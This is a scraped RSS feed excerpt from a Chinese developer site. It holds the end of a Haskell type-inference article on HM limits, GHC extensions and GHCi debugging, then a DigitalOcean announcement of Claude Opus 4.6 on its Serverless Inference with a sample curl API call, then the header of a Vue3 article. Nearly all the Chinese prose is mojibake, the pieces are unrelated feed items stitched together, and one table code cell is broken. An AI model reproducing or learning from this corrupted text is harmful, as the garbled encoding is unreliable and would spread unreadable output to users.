<h2 data-id="heading-21">1.4 ç±»å‹æ¨æ–­çš„é™åˆ¶ä¸è§£å†³æ–¹æ¡ˆ</h2>
<p>å°½ç®¡HMç®—æ³•èƒ½åŠ›å¼ºå¤§ï¼Œä½†åœ¨å¤æ‚åœºæ™¯ä¸‹ä»å­˜åœ¨æ¨æ–­é™åˆ¶ï¼ŒHaskellé€šè¿‡æ˜¾å¼æ ‡æ³¨å’Œæ‰©å±•ç‰¹æ€§è§£å†³è¿™äº›é—®é¢˜ã€‚</p>
<h3 data-id="heading-22">1.4.1 å¸¸è§é™åˆ¶åœºæ™¯</h3>
<ol>
<li>
<p>å¤æ‚é€’å½’å‡½æ•°ï¼šé€’å½’è°ƒç”¨çš„ç±»å‹ä¾èµ–è‡ªèº«ï¼Œæ¨æ–­é“¾è¿‡é•¿æ˜“å¯¼è‡´æ­§ä¹‰ï¼›</p>
</li>
<li>
<p>å¤šå‚æ•°ç±»å‹ç±»æ­§ä¹‰ï¼šå¤šå‚æ•°ç±»å‹ç±»ï¼ˆå¦‚<code>Convert a b</code>ï¼‰æ— æ³•å”¯ä¸€ç¡®å®šè¿”å›ç±»å‹ï¼›</p>
</li>
<li>
<p>æ•°å€¼ç±»å‹æ­§ä¹‰ï¼š<code>Num a =&gt; a</code>å¯æ¨å¯¼ä¸º<code>Int</code>/<code>Integer</code>/<code>Double</code>ï¼Œæ— ä¸Šä¸‹æ–‡æ—¶æ— æ³•ç¡®å®šï¼›</p>
</li>
<li>
<p>é«˜é˜¶ç±»å‹åµŒå¥—ï¼šå¤šå±‚å‡½æ•°åµŒå¥—+æ³›å‹ï¼Œæ¨æ–­ç»“æœè¶…å‡ºâ€œæœ€ä¸€èˆ¬é€šç”¨ç±»å‹â€èŒƒå›´ã€‚</p>
</li>
</ol>
<h3 data-id="heading-23">1.4.2 æ ¸å¿ƒè§£å†³æ–¹æ¡ˆ</h3>































<table><thead><tr><th>é™åˆ¶åœºæ™¯</th><th>è§£å†³æ–¹æ¡ˆ</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>é€’å½’/åµŒå¥—æ­§ä¹‰</td><td>æ˜¾å¼ç±»å‹æ ‡æ³¨</td><td><code>fact :: Int -&gt; Int; fact n = ...</code></td></tr><tr><td>å¤šå‚æ•°ç±»å‹ç±»æ­§ä¹‰</td><td>ç±»å‹ç±»å‡½æ•°ä¾èµ–ï¼ˆFunctionalDependenciesï¼‰</td><td>`class Convert a b</td><td>a -&gt; b where ...`</td></tr><tr><td>æ•°å€¼ç±»å‹æ­§ä¹‰</td><td>ç±»å‹é»˜è®¤è§„åˆ™/æ˜¾å¼æ ‡æ³¨</td><td><code>n :: Int = 100</code></td></tr><tr><td>é«˜é˜¶ç±»å‹æ­§ä¹‰</td><td>TypeApplicationsæ‰©å±•</td><td><code>read @Int "123"</code>ï¼ˆæŒ‡å®šç›®æ ‡ç±»å‹ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-24">1.4.3 è®¾è®¡æƒè¡¡ï¼šèƒ½åŠ›ä¸æˆæœ¬çš„å¹³è¡¡</h3>
<p>Haskellåœ¨ç±»å‹æ¨æ–­è®¾è®¡ä¸­éœ€å…¼é¡¾ä¸‰å¤§å¹³è¡¡ï¼š</p>
<ul>
<li>
<p>æ¨æ–­èƒ½åŠ› vs ç¼–è¯‘æ•ˆç‡ï¼šæ›´å¼ºçš„æ¨æ–­èƒ½åŠ›ä¼šå¢åŠ ç¼–è¯‘æ—¶é—´ï¼ŒGHCé€šè¿‡å¢é‡æ¨æ–­ã€ç¼“å­˜ä¼˜åŒ–å¹³è¡¡ï¼›</p>
</li>
<li>
<p>ç®€æ´æ€§ vs æ˜ç¡®æ€§ï¼šè¿‡åº¦ä¾èµ–æ¨æ–­ä¼šé™ä½ä»£ç å¯è¯»æ€§ï¼Œå› æ­¤é¼“åŠ±åœ¨å…¬å…±å‡½æ•°ä¸Šæ˜¾å¼æ ‡æ³¨ç±»å‹ï¼›</p>
</li>
<li>
<p>é€šç”¨æ€§ vs å®‰å…¨æ€§ï¼šæ— çº¦æŸæ³›å‹æ›´é€šç”¨ï¼Œä½†çº¦æŸæ³›å‹æ›´å®‰å…¨ï¼ŒHaskellé»˜è®¤ä¼˜å…ˆä¿è¯å®‰å…¨æ€§ã€‚</p>
</li>
</ul>
<h2 data-id="heading-25">1.5 GHCä¸­ç±»å‹æ¨æ–­çš„ä¼˜åŒ–å®ç°</h2>
<p>GHCï¼ˆGlasgow Haskell Compilerï¼‰ä½œä¸ºHaskellçš„ä¸»æµç¼–è¯‘å™¨ï¼Œå¯¹HMç®—æ³•åšäº†é’ˆå¯¹æ€§æ‰©å±•å’Œä¼˜åŒ–ã€‚</p>
<h3 data-id="heading-26">1.5.1 GHCå¯¹HMç®—æ³•çš„æ‰©å±•</h3>
<ul>
<li>
<p>é«˜é˜¶å¤šæ€æ”¯æŒï¼šé€šè¿‡<code>RankNTypes</code>æ‰©å±•æ”¯æŒâ€œå¤šæ€ç±»å‹ä½œä¸ºå‡½æ•°å‚æ•°â€ï¼Œçªç ´HMç®—æ³•çš„ä¸€é˜¶é™åˆ¶ï¼›</p>
</li>
<li>
<p>ç±»å‹ç±»çº¦æŸä¼˜åŒ–ï¼šç¼“å­˜å·²æ±‚è§£çš„çº¦æŸï¼Œé¿å…é‡å¤è®¡ç®—ï¼Œæå‡ç¼–è¯‘æ•ˆç‡ï¼›</p>
</li>
<li>
<p>å¢é‡ç±»å‹æ£€æŸ¥ï¼šä»…é‡æ–°æ¨æ–­ä¿®æ”¹çš„ä»£ç ç‰‡æ®µï¼Œè€Œéå…¨é‡é‡æ–°æ¨æ–­ã€‚</p>
</li>
</ul>
<h3 data-id="heading-27">1.5.2 ç±»å‹æ¨æ–­çš„è°ƒè¯•æ–¹æ³•</h3>
<p>GHCæä¾›äº†ä¾¿æ·çš„è°ƒè¯•å·¥å…·ï¼Œå¸®åŠ©å¼€å‘è€…ç†è§£æ¨æ–­ç»“æœã€æ’æŸ¥æ­§ä¹‰ï¼š</p>
<ol>
<li><code>:t</code>/<code>:type</code>å‘½ä»¤ï¼ˆGHCiï¼‰ï¼šæŸ¥çœ‹è¡¨è¾¾å¼çš„æ¨æ–­ç±»å‹ï¼Œæ˜¯æœ€å¸¸ç”¨çš„è°ƒè¯•æ‰‹æ®µï¼›</li>
</ol>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">ghci</span>&gt; :<span class="hljs-selector-tag">t</span> <span class="hljs-selector-tag">id</span>
<span class="hljs-selector-tag">id</span> :: <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">a</span>
<span class="hljs-selector-tag">ghci</span>&gt; :<span class="hljs-selector-tag">t</span> (+)
(+) :: <span class="hljs-selector-tag">Num</span> <span class="hljs-selector-tag">a</span> =&gt; <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">a</span> <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">a</span>
</code></pre>
<ol start="2">
<li>
<p>ç¼–è¯‘é”™è¯¯è§£è¯»ï¼šGHCçš„ç±»å‹é”™è¯¯ä¿¡æ¯ä¼šæ˜ç¡®æŒ‡å‡ºâ€œæœŸæœ›ç±»å‹â€ä¸â€œå®é™…æ¨æ–­ç±»å‹â€çš„å†²çªï¼Œå®šä½æ­§ä¹‰ç‚¹ï¼›</p>
</li>
<li>
<p><code>:set -fprint-explicit-foralls</code>ï¼šæ˜¾ç¤ºæ¨æ–­ç±»å‹ä¸­çš„<code>forall</code>å…³é”®å­—ï¼ŒæŸ¥çœ‹å®Œæ•´æ³›å‹çº¦æŸã€‚</p>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Claude Opus 4.6 ä¸Šçº¿ DigitalOceanï¼šç™¾ä¸‡ä¸Šä¸‹æ–‡ï¼Œä¸€é”®è°ƒç”¨]]></title>    <link>https://juejin.cn/post/7604045354071375906</link>    <guid>https://juejin.cn/post/7604045354071375906</guid>    <pubDate>2026-02-09T08:54:02.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604045354071375906" data-draft-id="7604045354071359522" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Claude Opus 4.6 ä¸Šçº¿ DigitalOceanï¼šç™¾ä¸‡ä¸Šä¸‹æ–‡ï¼Œä¸€é”®è°ƒç”¨"/> <meta itemprop="keywords" content="Claude"/> <meta itemprop="datePublished" content="2026-02-09T08:54:02.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="DigitalOcean"/> <meta itemprop="url" content="https://juejin.cn/user/2031553217827127"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Claude Opus 4.6 ä¸Šçº¿ DigitalOceanï¼šç™¾ä¸‡ä¸Šä¸‹æ–‡ï¼Œä¸€é”®è°ƒç”¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2031553217827127/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    DigitalOcean
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T08:54:02.000Z" title="Mon Feb 09 2026 08:54:02 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025 å¹´ï¼ŒDigitalOcean äº‘å¹³å°ä¸Šçº¿äº† Serverless Inferenceã€‚DigitalOcean Serverless Inference æ˜¯ä¸€ç§æ‰˜ç®¡å¼çš„å¤§æ¨¡å‹æ¨ç†æœåŠ¡ã€‚ä½ ä¸éœ€è¦åˆ›å»º GPU å®ä¾‹ã€ä¸ç”¨éƒ¨ç½²æ¨¡å‹ã€ä¸ç”¨å…³å¿ƒæ‰©ç¼©å®¹ï¼Œåªè¦é€šè¿‡ API è°ƒç”¨æ¨¡å‹ï¼ŒDigitalOcean å°±ä¼šåœ¨åå°è‡ªåŠ¨å®Œæˆæ¨ç†èµ„æºçš„è°ƒåº¦ä¸è¿è¡Œã€‚</p>
<p>ç°åœ¨ï¼ŒClaude Opus 4.6 å·²ç»ä¸Šçº¿ DigitalOcean Serverless Inferenceï¼Œæä¾›ç™¾ä¸‡çº§ä¸Šä¸‹æ–‡ä¸ Agentic èƒ½åŠ›ï¼Œå¸®åŠ©å›¢é˜Ÿåœ¨ç»Ÿä¸€äº‘ç¯å¢ƒä¸­é«˜æ•ˆæ„å»ºã€éƒ¨ç½²å¹¶æ‰©å±• AI æ¨ç†åº”ç”¨ã€‚</p>
<h2 data-id="heading-0">Claude Opus 4.6 ä¸Šçº¿ DigitalOceanï¼šç™¾ä¸‡ä¸Šä¸‹æ–‡çš„ Serverless æ¨ç†æ–°é€‰æ‹©</h2>
<p>â€‹<strong>Claude Opus 4.6 ç°å·²é€šè¿‡ Serverless Inference æœåŠ¡ä¸Šçº¿ DigitalOcean Gradientâ„¢ AI Platform</strong>â€‹ï¼Œè®©å›¢é˜Ÿå¯ä»¥åœ¨ä¸€ä¸ªä¸“ä¸ºå¤§è§„æ¨¡ç¨³å®šæ¨ç†è€Œæ‰“é€ çš„å¹³å°ä¸Šï¼Œç›´æ¥ä½¿ç”¨ Anthropic æœ€å¼ºå¤§çš„æ¨¡å‹ã€‚</p>
<p>ä½ ç°åœ¨å°±å¯ä»¥é€šè¿‡ APIï¼Œæˆ–åœ¨ DigitalOcean Cloud Console ä¸­å¼€å§‹ä½¿ç”¨è¿™ä¸€æ–°æ¨¡å‹ã€‚</p>
<p>å‡­å€Ÿé«˜è¾¾ â€‹<strong>100 ä¸‡ token çš„è¶…å¤§ä¸Šä¸‹æ–‡çª—å£</strong>â€‹ã€<strong>è‡ªé€‚åº”æ¨ç†èƒ½åŠ›</strong>ä»¥åŠâ€‹<strong>å…ˆè¿›çš„ Agentic ç¼–ç èƒ½åŠ›</strong>â€‹ï¼ŒClaude Opus 4.6 å¯ä»¥å¸®åŠ©å›¢é˜Ÿåœ¨ä¸€æ¬¡æ¨ç†ä¸­å®Œæˆå¯¹æµ·é‡æ•°æ®çš„åˆ†æã€æ•´å¥—ä»£ç åº“çš„é‡æ„ï¼Œå¹¶ç”Ÿæˆé«˜è´¨é‡è¾“å‡ºã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿé’ˆå¯¹æ—¥å¸¸çŸ¥è¯†å‹å·¥ä½œè¿›è¡Œäº†ä¼˜åŒ–ï¼ŒåŒ…æ‹¬æŠ¥å‘Šã€ç”µå­è¡¨æ ¼å’Œæ¼”ç¤ºæ–‡ç¨¿çš„ç”Ÿæˆã€‚</p>
<h2 data-id="heading-1">Opus 4.6 èƒ½è§£é”ä»€ä¹ˆèƒ½åŠ›</h2>
<p><strong>Agentic ç¼–ç ä¸è½¯ä»¶å¼€å‘</strong></p>
<p>åœ¨å¤§å‹ä»£ç åº“ä¸­è¿›è¡Œè§„åˆ’ã€è°ƒè¯•å’Œè¿­ä»£ï¼›æ‰§è¡Œæ ¹å› åˆ†æï¼›å¤„ç†å¤šè¯­è¨€ç¼–ç¨‹å’Œç½‘ç»œå®‰å…¨ç›¸å…³ä»»åŠ¡ã€‚</p>
<p><strong>çŸ¥è¯†å‹å·¥ä½œä¸ç ”ç©¶</strong></p>
<p>åˆ†æé‡‘èæ•°æ®ã€å¼€å±•ç ”ç©¶ï¼Œå¹¶åœ¨æ–‡æ¡£ã€è¡¨æ ¼å’Œæ¼”ç¤ºæ–‡ç¨¿ä¸­å®Œæˆå¤šæ­¥éª¤ä»»åŠ¡ç®¡ç†ã€‚</p>
<p><strong>Agentic è‡ªåŠ¨åŒ–</strong></p>
<p>åè°ƒå¤šä¸ª AI Agent å¹¶è¡Œæ‰§è¡Œè¯»å–å¯†é›†å‹æˆ–é•¿æ—¶é—´è¿è¡Œçš„ä»»åŠ¡ï¼›å¯¹è¶…å¤§ä¸Šä¸‹æ–‡è¿›è¡Œæ€»ç»“ï¼Œå¹¶åŸºäºä¸Šä¸‹æ–‡åšå‡ºè‡ªé€‚åº”æ¨ç†å†³ç­–ã€‚</p>
<p><strong>ä¿¡æ¯æ£€ç´¢ä¸é•¿ä¸Šä¸‹æ–‡æ¨ç†</strong></p>
<p>åœ¨åºå¤§çš„æ•°æ®é›†ä¸­æ£€ç´¢éš¾ä»¥å®šä½çš„ç»†èŠ‚ï¼Œå¹¶å¯¹æ•°åä¸‡ token çš„å†…å®¹è¿›è¡Œæ¨ç†ã€‚</p>
<p><strong>åŠå…¬æ•ˆç‡æå‡</strong></p>
<p>ç”Ÿæˆç»“æ„åŒ–æŠ¥å‘Šã€ç”µå­è¡¨æ ¼å’Œæ¼”ç¤ºæ–‡ç¨¿ï¼›æ‘„å–éç»“æ„åŒ–æ•°æ®ï¼Œå¹¶ä¸€æ¬¡æ€§è¾“å‡ºæ‰“ç£¨å®Œæˆçš„é«˜è´¨é‡ç»“æœã€‚</p>
<h2 data-id="heading-2">åœ¨ DigitalOcean ä¸Šä½¿ç”¨ Claude Opus 4.6 æœ‰ä»€ä¹ˆä¾¿æ·ä¹‹å¤„ï¼Ÿ</h2>
<p>Claude Opus 4.6 å¯ç›´æ¥è¿è¡Œåœ¨ä½ ç°æœ‰çš„ DigitalOcean ç¯å¢ƒä¸­ï¼Œä¸åº”ç”¨ã€æ•°æ®ã€ç½‘ç»œå’Œå­˜å‚¨å¹¶å­˜ï¼Œè®©æ¨ç†æˆä¸ºä½ æŠ€æœ¯æ ˆçš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªéœ€è¦é¢å¤–é›†æˆå’Œè¿ç»´çš„ç‹¬ç«‹ç³»ç»Ÿã€‚</p>
<p>æ— éœ€å•ç‹¬ç­¾ç½²æ¨¡å‹åˆåŒã€åˆ›å»ºå‚å•†è´¦å·æˆ–ç®¡ç†å¤šå¥—è®¡è´¹ä½“ç³»ã€‚ä½¿ç”¨é‡ä¼šä¸å…¶ä»– DigitalOcean æœåŠ¡ä¸€èµ·è¿›è¡Œè®¡è´¹ï¼Œè®¡è´¹è§„åˆ™ç®€å•é€æ˜ã€å®¹æ˜“é¢„ä¼°ï¼Œæ¨ç†æœåŠ¡é»˜è®¤æ‰˜ç®¡ï¼Œè¿™æ„å‘³ç€ä½ æ— éœ€é…ç½®æˆ–è°ƒä¼˜åŸºç¡€è®¾æ–½å³å¯å¿«é€Ÿä¸Šæ‰‹ Opus 4.6ã€‚</p>
<p>å¹³å°ä»ä¸€å¼€å§‹å°±å†…ç½®äº†å®‰å…¨é»˜è®¤é…ç½®ã€‚Opus 4.6 åœ¨ä½ çš„ DigitalOcean é¡¹ç›®ï¼ˆProjectï¼‰å†…è¿è¡Œï¼Œé‡‡ç”¨å®‰å…¨çš„é»˜è®¤è®¾ç½®ï¼Œéšç€å·¥ä½œè´Ÿè½½è§„æ¨¡æ‰©å¤§ï¼Œå¯æœ‰æ•ˆé™ä½è¿ç»´é£é™©ã€‚</p>
<p>æ€»ä¹‹ï¼Œä½ å¯ä»¥åœ¨åŒä¸€ä¸ªç¯å¢ƒä¸­ï¼Œç»“åˆ App Platformï¼ˆåº”ç”¨æ‰˜ç®¡ï¼‰ã€Kubernetesã€æ‰˜ç®¡æ•°æ®åº“å’Œå­˜å‚¨æœåŠ¡ï¼Œæ„å»ºã€éƒ¨ç½²å¹¶æ‰©å±•åŸºäº Opus 4.6 çš„ AI åº”ç”¨ã€‚ç›¸æ¯”è·¨äº‘è°ƒç”¨ç¬¬ä¸‰æ–¹æ¨¡å‹ APIï¼Œè¿™ç§åŸç”Ÿé›†æˆæ–¹å¼ç»„ä»¶æ›´å°‘ï¼Œç³»ç»Ÿå¤æ‚åº¦å’Œè¿ç»´æˆæœ¬ä¹Ÿæ›´ä½ã€‚</p>
<h2 data-id="heading-3">å¦‚ä½•ä½¿ç”¨ Claude Opus 4.6ï¼Ÿ</h2>
<p>Opus 4.6 å·²ä¸Šçº¿ DigitalOcean Serverless Inferenceï¼Œæ— éœ€ä»»ä½•åŸºç¡€è®¾æ–½çš„éƒ¨ç½²æˆ–ç®¡ç†ã€‚åªéœ€ä½¿ç”¨ä½ çš„æ¨¡å‹è®¿é—®å¯†é’¥è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå³å¯é€šè¿‡ä¸‹é¢çš„ <code>curl</code> è¯·æ±‚ç«‹å³è·å¾—å“åº”ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">curl https://inference.do-ai.run/v1/chat/completions \
  -H <span class="hljs-string">"Authorization: Bearer YOUR_MODEL_ACCESS_KEY"</span> \
  -H <span class="hljs-string">"Content-Type: application/json"</span> \
  -d <span class="hljs-string">'{
  "model": "anthropic-claude-opus-4.6",
  "messages": [
    {
      "role": "user",
      "content": "What is the capital of France?"
    }
  ],
  "temperature": 0.7,
  "max_tokens": 1000
}'</span>
</code></pre>
<p>ä½ ä¹Ÿå¯ä»¥åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fcloud.digitalocean.com%2Fgen-ai%2Fmodel-playground" target="_blank" title="https://cloud.digitalocean.com/gen-ai/model-playground" ref="nofollow noopener noreferrer">DigitalOcean Model Playground</a> ä¸­æµ‹è¯•è¿™ä¸€æ–°æ¨¡å‹ï¼Œæˆ–å°†å®ƒä¸å…¶ä»–ç°æœ‰æ¨¡å‹è¿›è¡Œå¯¹æ¯”ã€‚</p>
<p><img src="https://doimages.nyc3.cdn.digitaloceanspaces.com/002Blog/gradient_ai_platform_blog_headers/in_blog_imagery/CleanShot%202026-02-06%20at%2011.47.12@2x.png" alt="image alt text" loading="lazy"/></p>
<p>ğŸš€ <strong>ç«‹å³é€šè¿‡ DigitalOcean</strong> <strong>API</strong> <strong>æˆ– Cloud Console è®¿é—®</strong> <strong>Opus</strong> <strong>4.6ã€‚</strong></p>
<p>æƒ³è¿›ä¸€æ­¥äº†è§£ Opus 4.6 ä»¥åŠå¦‚ä½•é€šè¿‡ DigitalOcean ä½¿ç”¨å®ƒï¼Ÿæ¬¢è¿è®¿é—®å“æ™®äº‘å®˜ç½‘åšå®¢ï¼Œæˆ–è”ç³»å’¨è¯¢<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aidroplet.com%2F" target="_blank" title="https://www.aidroplet.com/" ref="nofollow noopener noreferrer">å“æ™®äº‘</a>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Vue3 + Element-Plus è‡ªå®šä¹‰è™šæ‹Ÿè¡¨æ ¼æ»šåŠ¨å®ç°æ–¹æ¡ˆã€é™„æºç ã€‘]]></title>    <link>https://juejin.cn/post/7604301929121169417</link>    <guid>https://juejin.cn/post/7604301929121169417</guid>    <pubDate>2026-02-09T09:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604301929121169417" data-draft-id="7604507125857484827" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Vue3 + Element-Plus è‡ªå®šä¹‰è™šæ‹Ÿè¡¨æ ¼æ»šåŠ¨å®ç°æ–¹æ¡ˆã€é™„æºç ã€‘"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-02-09T09:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜å¤§å«"/> <meta itemprop="url" content="https://juejin.cn/user/1961184474695213"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Vue3 + Element-Plus è‡ªå®šä¹‰è™šæ‹Ÿè¡¨æ ¼æ»šåŠ¨å®ç°æ–¹æ¡ˆã€é™„æºç ã€‘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1961184474695213/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜å¤§å«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:01:41.000Z" title="Mon Feb 09 2026 09:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
